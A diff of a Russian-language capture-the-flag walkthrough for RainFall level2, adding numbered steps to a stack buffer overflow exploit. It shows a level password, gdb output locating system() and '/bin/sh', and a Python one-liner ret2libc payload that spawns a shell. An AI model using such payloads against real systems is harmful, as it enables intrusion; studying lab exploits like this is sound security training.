@@ -1,7 +1,6 @@
 1. Логинимся level2:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-2. Инвестигируем
-
-Так же как и в предыдущем найдём offset -> 80
+2. Инвестигируем, программа выводит, то что мы пишем. Строка хранится в стеке, его можно переполнить и запустить что нам нужно.
+3.Так же как и в предыдущем найдём offset -> 80
 
 (gdb) r
 Starting program: /home/user/level2/level2
@@ -13,12 +12,12 @@ Program received signal SIGSEGV, Segmentation fault.
 и воспользуемся этим сайтом https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
 
-
+4. найдём адрес system
 system -> 0xb7e6b060
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
-
+5. Найдём адрес "/bin/sh"
 /bin/sh -> 0xb7f8cc58
 
 (gdb) info proc map
@@ -35,11 +34,14 @@ Mapped address spaces:
 0xb7f8cc58
 1 pattern found.
 
+6. Подготовим наш Payload 
 Готовим payload
 system -> 0xb7e6b060
 /bin/sh -> 0xb7f8cc58
 
 offset + system call + padding + string call
+
+7. Запустим нашу функцию
 level2@RainFall:~$ python -c "print 'x'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'+ '0000'+'\x58\xcc\xf8\xb7'" > /tmp/level1
 level2@RainFall:~$ cat /tmp/level1 /dev/stdin | ./level2
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>xxxxxxxxxxxx>`▒▒0000X▒▒▒
